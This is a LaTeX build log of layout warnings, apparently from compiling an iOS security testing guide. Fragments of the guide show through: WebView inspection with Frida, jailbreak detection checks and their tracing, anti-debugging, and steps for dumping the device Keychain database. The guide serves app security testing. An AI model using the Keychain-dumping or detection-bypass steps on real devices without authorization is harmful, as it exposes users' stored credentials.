Overfull \hbox (29.84943pt too wide) in paragraph at lines 43238--43238
[]\TU/SourceCodePro(6)/m/n/10.95 625 0x00031670 0x100031670  17  18 (5.__TEXT._
_cstring) ascii unwindToWKWebView[] 
[757]
Overfull \hbox (115.2594pt too wide) in paragraph at lines 43251--43251
[]\TU/SourceCodePro(6)/m/n/10.95 0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5fr
ame_So0aB13ConfigurationC13configurationtcfC[] 

Overfull \hbox (128.39935pt too wide) in paragraph at lines 43251--43251
[]\TU/SourceCodePro(6)/m/n/10.95 0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5fr
ame_So0aB13ConfigurationC13configurationtcfcTO[] 

Overfull \hbox (115.2594pt too wide) in paragraph at lines 43251--43251
[]\TU/SourceCodePro(6)/m/n/10.95 0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5fr
ame_So0aB13ConfigurationC13configurationtcfC[] 

Overfull \hbox (128.39935pt too wide) in paragraph at lines 43251--43251
[]\TU/SourceCodePro(6)/m/n/10.95 0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5fr
ame_So0aB13ConfigurationC13configurationtcfcTO[] 

Overfull \hbox (187.52933pt too wide) in paragraph at lines 43260--43260
[]\TU/SourceCodePro(6)/m/n/10.95 $ xcrun swift-demangle __T0So9WKWebViewCABSC6C
GRectV5frame_So0aB13ConfigurationC13configurationtcfcTO[] 

Overfull \hbox (51.74957pt too wide) in paragraph at lines 43260--43260
[]                                \TU/SourceCodePro(6)/m/n/10.95 configuration:
 __C.WKWebViewConfiguration) -> __C.WKWebView[] 

Overfull \hbox (69.26941pt too wide) in paragraph at lines 43287--43287
[]\TU/SourceCodePro(6)/m/n/10.95 391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT._
_objc_methname) ascii javaScriptEnabled[] 

Overfull \hbox (95.54941pt too wide) in paragraph at lines 43287--43287
[]\TU/SourceCodePro(6)/m/n/10.95 392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT._
_objc_methname) ascii setJavaScriptEnabled:[] 
[758] [759] [760]
Underfull \hbox (badness 2469) in paragraph at lines 43463--43466
[]\TU/SourceSansPro(0)/m/n/10.95 For \TU/SourceCodePro(6)/m/n/10.95 WKWebView\T
U/SourceSansPro(0)/m/n/10.95 , you should verify if JavaScript is enabled. Use 
[][]\TU/SourceCodePro(6)/m/n/10.95 javaScriptEnabled[][] \TU/SourceSansPro(0)/m
/n/10.95 from
[761]
Overfull \hbox (25.46942pt too wide) in paragraph at lines 43490--43490
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida -U com.authenticationfailure.WheresMyB
rowser -l webviews_inspector.js[] 

Overfull \hbox (93.3594pt too wide) in paragraph at lines 43490--43490
[]\TU/SourceCodePro(6)/m/n/10.95 onMatch:  <WKWebView: 0x1508b1200; frame = (0 
0; 320 393); layer = <CALayer: 0x1c4238f20>>[] 

Overfull \hbox (25.46942pt too wide) in paragraph at lines 43536--43536
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida -U com.authenticationfailure.WheresMyB
rowser -l webviews_inspector.js[] 
[762]
Overfull \hbox (93.3594pt too wide) in paragraph at lines 43536--43536
[]\TU/SourceCodePro(6)/m/n/10.95 onMatch:  <WKWebView: 0x1508b1200; frame = (0 
0; 320 393); layer = <CALayer: 0x1c4238f20>>[] 
[763]
Overfull \hbox (200.66936pt too wide) in paragraph at lines 43632--43632
[]\TU/SourceCodePro(6)/m/n/10.95 let scenario2HtmlPath = Bundle.main.url(forRes
ource: "web/UIWebView/scenario2.html", withExtension: nil)[] 

Overfull \hbox (51.74944pt too wide) in paragraph at lines 43632--43632
[]    \TU/SourceCodePro(6)/m/n/10.95 let scenario2Html = try String(contentsOf:
 scenario2HtmlPath!, encoding: .utf8)[] 

Overfull \hbox (238.88126pt too wide) in paragraph at lines 43638--43647
[]\TU/SourceSansPro(0)/m/n/10.95 When working with \TU/SourceCodePro(6)/m/n/10.
95 WKWebView\TU/SourceSansPro(0)/m/n/10.95 s, Apple recommends using [][]\TU/So
urceCodePro(6)/m/n/10.95 loadHTMLString:baseURL:[][]\TU/SourceSansPro(0)/m/n/10
.95 /[][]\TU/SourceCodePro(6)/m/n/10.95 loadData:MIMEType:textEncodingName:base
URL:[][]

Underfull \hbox (badness 3343) in paragraph at lines 43638--43647
\TU/SourceSansPro(0)/m/n/10.95 to load local HTML files and \TU/SourceCodePro(6
)/m/n/10.95 loadRequest: \TU/SourceSansPro(0)/m/n/10.95 for web content. Typica
lly, the local files are

Underfull \hbox (badness 2573) in paragraph at lines 43638--43647
\TU/SourceSansPro(0)/m/n/10.95 loaded in combination with methods including, am
ong others: [][]\TU/SourceCodePro(6)/m/n/10.95 pathForResource:ofType:[][]\TU/S
ourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (49.55939pt too wide) in paragraph at lines 43670--43670
[]    \TU/SourceCodePro(6)/m/n/10.95 WKWebViewConfiguration *configuration = [[
WKWebViewConfiguration alloc] init];[] 

Overfull \hbox (88.97943pt too wide) in paragraph at lines 43670--43670
[]        \TU/SourceCodePro(6)/m/n/10.95 CGRectGetHeight([UIScreen mainScreen].
bounds) - 84) configuration:configuration];[] 
[764]
Overfull \hbox (139.3494pt too wide) in paragraph at lines 43670--43670
[]    \TU/SourceCodePro(6)/m/n/10.95 NSString *filePath = [[NSBundle mainBundle
] pathForResource:@"example_file" ofType:@"html"];[] 

Overfull \hbox (47.36942pt too wide) in paragraph at lines 43670--43670
[]    \TU/SourceCodePro(6)/m/n/10.95 [self.webView loadHTMLString:html baseURL:
[NSBundle mainBundle].resourceURL];[] 

Overfull \hbox (200.66936pt too wide) in paragraph at lines 43682--43682
[]\TU/SourceCodePro(6)/m/n/10.95 let scenario2HtmlPath = Bundle.main.url(forRes
ource: "web/WKWebView/scenario2.html", withExtension: nil)[] 

Overfull \hbox (51.74944pt too wide) in paragraph at lines 43682--43682
[]    \TU/SourceCodePro(6)/m/n/10.95 let scenario2Html = try String(contentsOf:
 scenario2HtmlPath!, encoding: .utf8)[] 

Overfull \hbox (5.7594pt too wide) in paragraph at lines 43690--43690
[]\TU/SourceCodePro(6)/m/n/10.95 231 0x0002df6c 24 (4.__TEXT.__objc_methname) a
scii loadHTMLString:baseURL:[] 

Overfull \hbox (51.52684pt too wide) in paragraph at lines 43699--43708
[]\TU/SourceSansPro(0)/m/n/10.95 In addition, you should also verify if the app
 is using the method [][]\TU/SourceCodePro(6)/m/n/10.95 loadFileURL:allowingRea
dAccessToURL:[][]\TU/SourceSansPro(0)/m/n/10.95 .

Overfull \hbox (115.25938pt too wide) in paragraph at lines 43717--43717
[]\TU/SourceCodePro(6)/m/n/10.95 var scenario1Url = FileManager.default.urls(fo
r: .libraryDirectory, in: .userDomainMask)[0][] 

Overfull \hbox (38.60938pt too wide) in paragraph at lines 43717--43717
[]\TU/SourceCodePro(6)/m/n/10.95 scenario1Url = scenario1Url.appendingPathCompo
nent("WKWebView/scenario1.html")[] 

Overfull \hbox (30.29405pt too wide) in paragraph at lines 43719--43722
[]\TU/SourceSansPro(0)/m/n/10.95 In this case, the parameter \TU/SourceCodePro(
6)/m/n/10.95 allowingReadAccessToURL \TU/SourceSansPro(0)/m/n/10.95 contains a 
single file “WKWebView/scenario1.html”,
[765]
Overfull \hbox (91.16939pt too wide) in paragraph at lines 43728--43728
[]\TU/SourceCodePro(6)/m/n/10.95 237 0x0002dff1 37 (4.__TEXT.__objc_methname) a
scii loadFileURL:allowingReadAccessToURL:[] 

Underfull \hbox (badness 10000) in paragraph at lines 43764--43769
[]\TU/SourceCodePro(6)/m/n/10.95 allowFileAccessFromFileURLs \TU/SourceSansPro(
0)/m/n/10.95 (\TU/SourceCodePro(6)/m/n/10.95 WKPreferences\TU/SourceSansPro(0)/
m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 false \TU/SourceSansPro(0)/m/n/10.95
 by default): it enables

Underfull \hbox (badness 1127) in paragraph at lines 43764--43769
\TU/SourceSansPro(0)/m/n/10.95 JavaScript running in the context of a \TU/Sourc
eCodePro(6)/m/n/10.95 file:// \TU/SourceSansPro(0)/m/n/10.95 scheme URL to acce
ss content from other

Underfull \hbox (badness 3492) in paragraph at lines 43769--43773
[]\TU/SourceCodePro(6)/m/n/10.95 allowUniversalAccessFromFileURLs \TU/SourceSan
sPro(0)/m/n/10.95 (\TU/SourceCodePro(6)/m/n/10.95 WKWebViewConfiguration\TU/Sou
rceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 false \TU/SourceSansPr
o(0)/m/n/10.95 by de-

Overfull \hbox (104.30936pt too wide) in paragraph at lines 43783--43783
[]\TU/SourceCodePro(6)/m/n/10.95 [webView.configuration.preferences setValue:@Y
ES forKey:@"allowFileAccessFromFileURLs"];[] 

Overfull \hbox (97.73936pt too wide) in paragraph at lines 43789--43789
[]\TU/SourceCodePro(6)/m/n/10.95 webView.configuration.preferences.setValue(tru
e, forKey: "allowFileAccessFromFileURLs")[] 
[766]
Underfull \hbox (badness 1418) in paragraph at lines 43799--43811
\TU/SourceSansPro(0)/m/n/10.95 can be found in the [][]Apple developer documena
tion[][]. Phone links should be then used (e.g. \TU/SourceCodePro(6)/m/n/10.95 
<a

Underfull \hbox (badness 3312) in paragraph at lines 43848--43853
[]\TU/SourceSansPro(0)/m/n/10.95 As we have seen above in “Testing How WebViews
 are Loaded”, if “scenario 2” of the WKWe-

Underfull \hbox (badness 5161) in paragraph at lines 43848--43853
\TU/SourceSansPro(0)/m/n/10.95 bViews is loaded, the app will do so by calling 
[][]\TU/SourceCodePro(6)/m/n/10.95 URLForResource:withExtension:[][] \TU/Source
SansPro(0)/m/n/10.95 and

Underfull \hbox (badness 3291) in paragraph at lines 43854--43856
[]\TU/SourceSansPro(0)/m/n/10.95 To quicky inspect this, you can use frida-trac
e and trace all “loadHTMLString” and “URLForRe-

Overfull \hbox (23.27945pt too wide) in paragraph at lines 43871--43871
[]    \TU/SourceCodePro(6)/m/n/10.95 -m "*[WKWebView *loadHTMLString*]" -m "*[*
 URLForResource:withExtension:]"[] 
[767] [768]
Overfull \hbox (159.5245pt too wide) in paragraph at lines 43923--43923
[]\TU/SourceCodePro(6)/m/n/10 wk[].[]configuration[]().[]preferences[]().[]valu
eForKey_[]([][]allowFileAccessFromFileURLs[][]).[]toString[]())[];[]|  

Overfull \hbox (105.5245pt too wide) in paragraph at lines 43926--43926
[]\TU/SourceCodePro(6)/m/n/10 wk[].[]configuration[]().[]valueForKey_[]([][]all
owUniversalAccessFromFileURLs[][]).[]toString[]())[];[]|  

Overfull \hbox (42.98943pt too wide) in paragraph at lines 43962--43962
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida -U -f com.authenticationfailure.Wheres
MyBrowser -l webviews_inspector.js[] 
[769]
Overfull \hbox (34.22939pt too wide) in paragraph at lines 44020--44020
[]\TU/SourceCodePro(6)/m/n/10.95 [webView valueForKeyPath:@"documentView.webVie
w.mainFrame.javaScriptContext"][] 
[770]
Overfull \hbox (14.5194pt too wide) in paragraph at lines 44056--44056
[]    \TU/SourceCodePro(6)/m/n/10.95 let userContentController = wkWebViewConfi
guration.userContentController[] 

Overfull \hbox (51.7494pt too wide) in paragraph at lines 44056--44056
[]    \TU/SourceCodePro(6)/m/n/10.95 userContentController.removeScriptMessageH
andler(forName: "javaScriptBridge")[] 

Overfull \hbox (29.84946pt too wide) in paragraph at lines 44056--44056
[]            \TU/SourceCodePro(6)/m/n/10.95 let javaScriptBridgeMessageHandler
 = JavaScriptBridgeMessageHandler()[] 

Overfull \hbox (124.01942pt too wide) in paragraph at lines 44056--44056
[]            \TU/SourceCodePro(6)/m/n/10.95 userContentController.add(javaScri
ptBridgeMessageHandler, name: "javaScriptBridge")[] 

Overfull \hbox (115.6463pt too wide) in paragraph at lines 44058--44066
\TU/SourceSansPro(0)/m/n/10.95 causes the JavaScript function \TU/SourceCodePro
(6)/m/n/10.95 window.webkit.messageHandlers.myJavaScriptMessageHandler.postMess
age

Overfull \hbox (27.5245pt too wide) in paragraph at lines 44072--44072
\TU/SourceCodePro(6)/m/n/10 dow[].[]webkit[].[]messageHandlers[].[]javaScriptBr
idge[].[]postMessage[]([[]"multiplyNumbers"[][],[] 
[771]
Overfull \hbox (75.83936pt too wide) in paragraph at lines 44094--44094
[]\TU/SourceCodePro(6)/m/n/10.95 let javaScriptCallBack = "javascriptBridgeCall
Back([]\(functionFromJS)[],[]\(result)[])"[] 

Overfull \hbox (45.1794pt too wide) in paragraph at lines 44094--44094
[]\TU/SourceCodePro(6)/m/n/10.95 message.webView?.evaluateJavaScript(javaScript
CallBack, completionHandler: nil)[] 

Underfull \hbox (badness 2538) in paragraph at lines 44135--44143
\TU/SourceSansPro(0)/m/n/10.95 iOS WebViews ([][]\TU/SourceCodePro(6)/m/n/10.95
 stringByEvaluatingJavaScriptFromString:[][] \TU/SourceSansPro(0)/m/n/10.95 for
 \TU/SourceCodePro(6)/m/n/10.95 UIWebView \TU/SourceSansPro(0)/m/n/10.95 and
[772]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/843077a52818429fe7eadddb9f213dda9441d42b.
png" > [773]
Underfull \hbox (badness 1688) in paragraph at lines 44182--44193
[]\TU/SourceSansPro(0)/m/n/10.95 iOS comes with two protocols for object encodi
ng and decoding for Objective-C or \TU/SourceCodePro(6)/m/n/10.95 NSObject\TU/S
ourceSansPro(0)/m/n/10.95 s:
[774]
Overfull \hbox (12.32938pt too wide) in paragraph at lines 44271--44271
[]\TU/SourceCodePro(6)/m/n/10.95 NSKeyedArchiver.archiveRootObject(customPoint,
 toFile: "/path/to/archive")[] 

Overfull \hbox (104.30934pt too wide) in paragraph at lines 44271--44271
[]\TU/SourceCodePro(6)/m/n/10.95 guard let customPoint = NSKeyedUnarchiver.unar
chiveObjectWithFile("/path/to/archive") as?[] 
[775] [776]
Overfull \hbox (0.46265pt too wide) in paragraph at lines 44355--44358
[]\TU/SourceSansPro(0)/m/n/10.95 Next, Apple provides support for JSON encoding
/decoding directly by combining \TU/SourceCodePro(6)/m/n/10.95 Codable \TU/Sour
ceSansPro(0)/m/n/10.95 together with

Overfull \hbox (25.46938pt too wide) in paragraph at lines 44401--44401
[]\TU/SourceCodePro(6)/m/n/10.95 NSUserDefaults.standardUserDefaults().setObjec
t(data, forKey: "customPoint")[] 
[777]
Overfull \hbox (119.63936pt too wide) in paragraph at lines 44401--44401
[]\TU/SourceCodePro(6)/m/n/10.95 if let data = NSUserDefaults.standardUserDefau
lts().objectForKey("customPoint") as? NSData {[] 

Overfull \hbox (106.4994pt too wide) in paragraph at lines 44423--44423
[]    \TU/SourceCodePro(6)/m/n/10.95 UserDefaults.standard.set(try? PropertyLis
tEncoder().encode(points), forKey: "points")[] 

Overfull \hbox (110.87943pt too wide) in paragraph at lines 44423--44423
[]        \TU/SourceCodePro(6)/m/n/10.95 let points2 = try? PropertyListDecoder
().decode([CustomPointStruct].self, from: data)[] 
[778]
Overfull \hbox (55.11115pt too wide) in paragraph at lines 44460--44463
[]\TU/SourceSansPro(0)/m/n/10.95 When not using third party libraries, but Appl
e’s \TU/SourceCodePro(6)/m/n/10.95 XMLParser\TU/SourceSansPro(0)/m/n/10.95 , be
 sure to let \TU/SourceCodePro(6)/m/n/10.95 shouldResolveExternalEntities
[779] [780]
Underfull \hbox (badness 10000) in paragraph at lines 44631--44634
[][][][][][] [] [][] [] [][][][] [] [][][][] [] [][][][][][][][] [] [][][][][] 
[] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][][] [] [][][] [] []
[][][][][][] [] [][] [] [][][] [] [][][][] []
[781]
Underfull \hbox (badness 10000) in paragraph at lines 44705--44707
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][]
[][][][][][][][][][] [] [][][][][][][][][][] [] [][][][][][][][] [] [][][] [] [
][][][][][][][][][][][][] [] [][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 44713--44715
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][]
[][][][][][][][][][] [] [][][][][][][][][][] [] [][][][][][][][] [] [][][] [] [
][][][][][][][][][][][][] [] [][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 44715--44717
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][]
[][][][][][][][][][] [] [][][][][][][][][][] [] [][][][][][][][] [] [][][] [] [
][][][][][][][][][][][][] [] [][][][][] []

Overfull \hbox (14.78555pt too wide) in paragraph at lines 44719--44721
[][][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][] [][] [][][] [][] [][]
[][][] [][] [][][][][][][][][][][] [] [][][][][][][][][] [][] [][] [][] [][][][
][][][] [][] [][][][] [][] [][][][][][][][] [][] [][][][][][][][][][][][]$[][] 

[782]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 44777--44777
[]\TU/SourceCodePro(6)/m/n/10.95 CodeDirectory v=20200 size=154808 flags=0x0(no
ne) hashes=4830+5 location=embedded[] 
[783]
Underfull \hbox (badness 3375) in paragraph at lines 44815--44818
[]\TU/SourceSansPro(0)/m/n/10.95 Under ‘Apple LVM - Preprocessing’ and ‘Preproc
essor Macros’, make sure ‘DEBUG’ or ‘DE-
[784] [785]
Underfull \hbox (badness 4205) in paragraph at lines 44923--44926
[]\TU/SourceSansPro(0)/m/n/10.95 Search the code for the following printing fun
ctions: \TU/SourceCodePro(6)/m/n/10.95 NSLog\TU/SourceSansPro(0)/m/n/10.95 , \T
U/SourceCodePro(6)/m/n/10.95 println\TU/SourceSansPro(0)/m/n/10.95 , \TU/Source
CodePro(6)/m/n/10.95 print\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)
/m/n/10.95 dump\TU/SourceSansPro(0)/m/n/10.95 ,
[786] [787]
Underfull \hbox (badness 2368) in paragraph at lines 45048--45052
[]\TU/SourceSansPro(0)/m/n/10.95 There are three widely used package management
 tools [][]Swift Package Manager[][], [][]Carthage[][], and
[788] [789] [790] [791] [792] [793]
Underfull \hbox (badness 1558) in paragraph at lines 45455--45474
[]\TU/SourceSansPro(0)/m/n/10.95 Exception handing in Swift (2 - 5) is quite di
fferent. The try-catch block is not there to handle
[794] [795] [796]
Overfull \hbox (222.56935pt too wide) in paragraph at lines 45632--45632
[]    \TU/SourceCodePro(6)/m/n/10.95 guard let url = URL(string: "https://raw.g
ithubusercontent.com/OWASP/owasp-mstg/master/book.json") else {[] 

Overfull \hbox (62.6994pt too wide) in paragraph at lines 45632--45632
[]\TU/SourceCodePro(6)/m/n/10.95 func request(url: URL, completion: @escaping (
Result<MSTG, RequestError>) -> Void) {[] 
[797]
Overfull \hbox (40.7995pt too wide) in paragraph at lines 45632--45632
[]                \TU/SourceCodePro(6)/m/n/10.95 guard let response = try? deco
der.decode(MSTG.self, from: data) else {[] 
[798]
Overfull \hbox (25.98166pt too wide) in paragraph at lines 45717--45722
\TU/SourceSansPro(0)/m/n/10.95 that shouldn’t be easily retrievable. The handle
r can be set via \TU/SourceCodePro(6)/m/n/10.95 NSSetUncaughtExceptionHandler\T
U/SourceSansPro(0)/m/n/10.95 . 
[799]
Overfull \hbox (111.40877pt too wide) in paragraph at lines 45828--45832
[]\TU/SourceSansPro(0)/m/n/10.95 Next, you can check whether memory is freed to
o fast or too slow by enabling \TU/SourceCodePro(6)/m/n/10.95 NSAutoreleaseFree
dObjectCheckEnabled\TU/SourceSansPro(0)/m/n/10.95 ,
[800] [801] [802]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/88d9e255a1243b1933f293f801ad60b967a4ed03.
png" > [803]
Underfull \hbox (badness 10000) in paragraph at lines 46032--46034
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][]
[][][][] [] [][][][][][][] [] [][][][][][][][][][][][][] [] [][][][][] [] [][][
][][][][][][][] [] [][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 46034--46035
[][][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][][][] [][] [][][]
[][][][][][][][] [] [][][] [][] [][][][][][][][][][][] [][] [][][][][][] [][] [
][][][][] [][] [][][][][] [][] [][][] [][] [][][][][] [][]
[804]
Underfull \hbox (badness 10000) in paragraph at lines 46093--46095
[]\TU/SourceSansPro(0)/m/n/10.95 Codesign - [][]$[][][][][] [] [] [] [][][][][]
[][][][] [] [][][][][] [] [][][] [] [][][][][][][] [] [][][][][][][] [] [][][][
][][][][][][][][][] [] [][][][][][][][] [] [][][][][][][][][][] []
[805]
Overfull \hbox (102.1194pt too wide) in paragraph at lines 46186--46186
[]   \TU/SourceCodePro(6)/m/n/10.95 [[NSFileManager defaultManager] removeItemA
tPath:@"/private/jailbreak.txt" error:nil];[] 
[806]
Overfull \hbox (259.79935pt too wide) in paragraph at lines 46198--46198
[]\TU/SourceCodePro(6)/m/n/10.95 if([[UIApplication sharedApplication] canOpenU
RL:[NSURL URLWithString:@"cydia://package/com.example.package"]]){[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/cf614ae451bbad93635811b9e53554f0f55bbc3c.
png" > [807]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a9246692bf50d7cf2d6312b100d30e7c6deea379.
png" > [808]
Underfull \hbox (badness 1024) in paragraph at lines 46271--46276
[]\TU/SourceSansPro(0)/m/n/10.95 As you can see, our class method was called di
rectly, and it returned “true”. Now, let’s call the

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/aa88d9be69692cc72825cb21b5db66c3a3b04933.
png" > [809]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a3c0b37c8ec6ce33695b9fb2794d8af5880f033d.
png" >
Overfull \hbox (314.54935pt too wide) in paragraph at lines 46354--46354
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida-trace -U -f /Applications/DamnVulnerab
leIOSApp.app/DamnVulnerableIOSApp  -m "-[JailbreakDetectionVC isJailbroken]"[] 

[810]
Overfull \hbox (321.11934pt too wide) in paragraph at lines 46387--46387
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida-trace -U -f /Applications/DamnVulnerab
leIOSApp.app/DamnVulnerableIOSApp  -m "-[JailbreakDetectionVC isJailbroken]:"[]
 

Overfull \hbox (255.41933pt too wide) in paragraph at lines 46387--46387
[]\TU/SourceCodePro(6)/m/n/10.95 -[JailbreakDetectionVC isJailbroken]: Loaded h
andler at "./__handlers__/__JailbreakDetectionVC_isJailbroken_.js"[] 
[811] [812] [813] [814]
Overfull \hbox (36.41942pt too wide) in paragraph at lines 46571--46571
[]\TU/SourceCodePro(6)/m/n/10.95 typedef int (*ptrace_ptr_t)(int _request, pid_
t _pid, caddr_t _addr, int _data);[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7e0b90280358800d0d8dd506c16a9aa7131f24db.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ce91965ea5c01a401c81870af5e87e03516b28d1.
png" > [815] [816]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/14eb01600e94692001b0400a81a0fe1cf64da602.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/cc3959523dec4d1ba423fc34e7a72ba96a9fa1fb.
png" > [817] [818] [819] [820]
Overfull \hbox (97.73941pt too wide) in paragraph at lines 46845--46845
[]    \TU/SourceCodePro(6)/m/n/10.95 NSMutableData* digestBuffer = [NSMutableDa
ta dataWithLength:CC_SHA256_DIGEST_LENGTH];[] 

Overfull \hbox (491.93927pt too wide) in paragraph at lines 46845--46845
[]    \TU/SourceCodePro(6)/m/n/10.95 CCHmac(kCCHmacAlgSHA256, [actualData bytes
], (CC_LONG)[key length], [actualData bytes], (CC_LONG)[actualData length], [di
gestBuffer mutableBytes]);[] 

Overfull \hbox (279.50934pt too wide) in paragraph at lines 46870--46870
[]  \TU/SourceCodePro(6)/m/n/10.95 NSData* hmac = [data subdataWithRange:NSMake
Range(data.length - CC_SHA256_DIGEST_LENGTH, CC_SHA256_DIGEST_LENGTH)];[] 

Overfull \hbox (108.68939pt too wide) in paragraph at lines 46870--46870
[]  \TU/SourceCodePro(6)/m/n/10.95 NSData* actualData = [data subdataWithRange:
NSMakeRange(0, (data.length - hmac.length))];[] 

Overfull \hbox (88.9794pt too wide) in paragraph at lines 46870--46870
[]  \TU/SourceCodePro(6)/m/n/10.95 NSMutableData* digestBuffer = [NSMutableData
 dataWithLength:CC_SHA256_DIGEST_LENGTH];[] 

Overfull \hbox (483.17926pt too wide) in paragraph at lines 46870--46870
[]  \TU/SourceCodePro(6)/m/n/10.95 CCHmac(kCCHmacAlgSHA256, [actualData bytes],
 (CC_LONG)[key length], [actualData bytes], (CC_LONG)[actualData length], [dige
stBuffer mutableBytes]);[] 
[821] [822]
Overfull \hbox (255.86594pt too wide) in paragraph at lines 46996--47002
\TU/SourceSansPro(0)/m/n/10.95 side the \TU/SourceCodePro(6)/m/n/10.95 <Applica
tion>.app \TU/SourceSansPro(0)/m/n/10.95 directory. If you inspect the content 
of the \TU/SourceCodePro(6)/m/n/10.95 /var/containers/Bundle/Application/<UUID>
/<Application>.app
[823] [824] [825] [826] [827]
Overfull \hbox (16.70938pt too wide) in paragraph at lines 47265--47265
[]\TU/SourceCodePro(6)/m/n/10.95 __T07DVIA_v232JailbreakDetectionViewController
C20jailbreakTest4TappedyypF:[] 
[828]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/3f030b8c86c7c6cc516e082a4161b4b92914121b.
png" > [829] [830]
Overfull \hbox (27.5245pt too wide) in paragraph at lines 47404--47404
\TU/SourceCodePro(6)/m/n/10 (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC
20amIReverseEngineeredSbyFZ)|  

Overfull \hbox (177.5245pt too wide) in paragraph at lines 47405--47405
\TU/SourceCodePro(6)/m/n/10 (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC
9checkDYLD33_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ)|  

Overfull \hbox (315.5245pt too wide) in paragraph at lines 47406--47406
\TU/SourceCodePro(6)/m/n/10 (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC
31checkExistenceOfSuspiciousFiles33_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ)|  

[831]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/0578a17ea75d138074bdaae5284ec9b7ebabe3ea.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/4353ea9e0ca8fb1454b4d8eb9dfa0b42c7673cf9.
png" >
Overfull \hbox (19.88026pt too wide) in paragraph at lines 47428--47430
 [][] 
[832] [833]
Overfull \hbox (15.88817pt too wide) in paragraph at lines 47525--47530
[]\TU/SourceSansPro(0)/m/n/10.95 using the UDID: \TU/SourceCodePro(6)/m/n/10.95
 [[[UIDevice currentDevice] identifierForVendor] UUIDString];

Overfull \hbox (38.16412pt too wide) in paragraph at lines 47530--47534
[]\TU/SourceSansPro(0)/m/n/10.95 Any Keychain- or filesystem-based binding, whi
ch isn’t protected by \TU/SourceCodePro(6)/m/n/10.95 SecAccessControlCreateFlag
s

Overfull \hbox (190.44939pt too wide) in paragraph at lines 47530--47534
\TU/SourceSansPro(0)/m/n/10.95 or and doesn’t use protection classes, such as \
TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleAlways \TU/SourceSansPro(0)/m/n
/10.95 and \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleAlwaysThisDeviceOnl
y\TU/SourceSansPro(0)/m/n/10.95 . 

Overfull \hbox (204.76152pt too wide) in paragraph at lines 47573--47575
[]\TU/SourceSansPro(0)/m/n/10.95 Copy the contents of the Keychain. Since iOS 8
, this has been in \TU/SourceCodePro(6)/m/n/10.95 ~/Library/Developer/CoreSimul
ator/Devices/<Simulator
[834]
Overfull \hbox (146.45348pt too wide) in paragraph at lines 47611--47617
\TU/SourceCodePro(6)/m/n/10.95 <name of app>\TU/SourceSansPro(0)/m/n/10.95 ). T
he directory is in \TU/SourceCodePro(6)/m/n/10.95 /private/var/mobile/Container
s/Data/Application/<Application

Underfull \hbox (badness 4569) in paragraph at lines 47617--47623
[]\TU/SourceSansPro(0)/m/n/10.95 SSH into the directory indicated by the given 
command’s output or use SCP (\TU/SourceCodePro(6)/m/n/10.95 scp

Underfull \hbox (badness 10000) in paragraph at lines 47617--47623
\TU/SourceCodePro(6)/m/n/10.95 <ipaddress>:/<folder_found_in_previous_step> tar
getfolder\TU/SourceSansPro(0)/m/n/10.95 ) to

Overfull \hbox (60.89995pt too wide) in paragraph at lines 47623--47630
[]\TU/SourceSansPro(0)/m/n/10.95 Retrieve the data from the keychain, which is 
stored in \TU/SourceCodePro(6)/m/n/10.95 /private/var/Keychains/keychain-2.db\T
U/SourceSansPro(0)/m/n/10.95 ,

Underfull \hbox (badness 2726) in paragraph at lines 47623--47630
\TU/SourceSansPro(0)/m/n/10.95 which you can retrieve using the [][]keychain du
mper[][]. First make the keychain world-

Overfull \hbox (303.33284pt too wide) in paragraph at lines 47651--47662
\TU/SourceCodePro(6)/m/n/10.95 UIDevice.current.identifierForVendor?.uuidString
 \TU/SourceSansPro(0)/m/n/10.95 (in Swift3), or \TU/SourceCodePro(6)/m/n/10.95 
UIDevice.currentDevice().identifierForVendor?.UUIDString
[835]
Overfull \hbox (0.92685pt too wide) in paragraph at lines 47662--47670
\TU/SourceSansPro(0)/m/n/10.95 this data is not backed up, use \TU/SourceCodePr
o(6)/m/n/10.95 kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly

Underfull \hbox (badness 1137) in paragraph at lines 47662--47670
